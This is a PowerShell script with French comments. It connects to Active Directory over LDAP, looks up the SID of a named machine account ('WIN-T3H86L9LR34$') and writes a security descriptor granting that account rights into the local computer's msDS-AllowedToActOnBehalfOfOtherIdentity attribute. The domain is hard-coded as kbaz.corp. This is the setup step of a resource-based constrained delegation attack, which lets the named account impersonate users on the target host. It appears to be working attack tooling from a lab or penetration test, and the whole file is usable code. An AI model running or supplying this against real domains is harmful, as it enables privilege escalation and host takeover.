Add-Type -AssemblyName System.DirectoryServices.Protocols

# --- Paramètres ---

$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainName = $domain.Name
$serveur = $domainName
$baseDN = ($domainName -split '\.' | ForEach-Object { "DC=$_" }) -join ','
$computerName = $env:COMPUTERNAME

$compteCible   = "CN=$($computerName),CN=Computers,DC=kbaz,DC=corp"
$compteRemote  = "WIN-T3H86L9LR34$"  # exemple "WIN-T3H86L9LR34$"

# --- Récupérer le SID du compte remote via LDAP ---
$connexion = New-Object System.DirectoryServices.Protocols.LdapConnection($serveur)
$connexion.SessionOptions.ProtocolVersion = 3
$connexion.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
$connexion.Bind()

$rechercheSid = New-Object System.DirectoryServices.Protocols.SearchRequest(
    "DC=kbaz,DC=corp",
    "(sAMAccountName=$compteRemote)",
    [System.DirectoryServices.Protocols.SearchScope]::Subtree,
    "objectSid"
)
$reponseSid = $connexion.SendRequest($rechercheSid)
$sidBytes   = $reponseSid.Entries[0].Attributes["objectSid"][0]
$sid        = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)

Write-Host "SID du compte Remote : $($sid.Value)"

# --- Construire le SDDL avec ce SID ---
$sddl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid.Value))"

$sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($sddl)
$sdBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)

# --- Construire la modification LDAP ---
$modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
$modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
$modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
$modification.Add($sdBytes) | Out-Null

# --- Envoyer la requête de modification ---
$requeteModif = New-Object System.DirectoryServices.Protocols.ModifyRequest
$requeteModif.DistinguishedName = $compteCible
$requeteModif.Modifications.Add($modification) | Out-Null

$connexion.SendRequest($requeteModif) | Out-Null

Write-Host "Attribut msDS-AllowedToActOnBehalfOfOtherIdentity mis à jour sur $compteCible avec délégation pour $compteRemote"
